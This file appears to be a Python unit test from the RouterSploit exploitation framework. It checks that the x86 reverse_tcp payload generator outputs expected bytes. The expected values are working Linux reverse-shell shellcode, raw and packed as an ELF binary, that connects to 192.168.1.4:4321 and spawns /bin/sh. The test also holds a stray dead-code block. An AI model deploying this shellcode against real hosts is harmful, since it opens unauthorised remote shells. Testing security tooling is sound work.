from routersploit.modules.payloads.x86.reverse_tcp import Payload
reverse_tcp = b'1\xdb\xf7\xe3SCSj\x02\x89\xe1\xb0f\xcd\x80\x93Y\xb0?\xcd\x80Iy\xf9h\xc0\xa8\x01\x04h\x02\x00\x10\xe1\x89\xe1\xb0fPQS\xb3\x03\x89\xe1\xcd\x80Rhn/shh//bi\x89\xe3RS\x89\xe1\xb0\x0b\xcd\x80'
elf_x86_reverse_tcp = b'\x7fELF\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x03\x00\x01\x00\x00\x00T\x80\x04\x084\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x004\x00 \x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x80\x04\x08\x00\x80\x04\x08\x98\x00\x00\x00\xdc\x00\x00\x00\x07\x00\x00\x00\x00\x10\x00\x001\xdb\xf7\xe3SCSj\x02\x89\xe1\xb0f\xcd\x80\x93Y\xb0?\xcd\x80Iy\xf9h\xc0\xa8\x01\x04h\x02\x00\x10\xe1\x89\xe1\xb0fPQS\xb3\x03\x89\xe1\xcd\x80Rhn/shh//bi\x89\xe3RS\x89\xe1\xb0\x0b\xcd\x80'

def test_payload_generation():
    if False:
        i = 10
        return i + 15
    ' Test scenario - payload generation '
    payload = Payload()
    payload.lhost = '192.168.1.4'
    payload.lport = 4321
    assert payload.generate() == reverse_tcp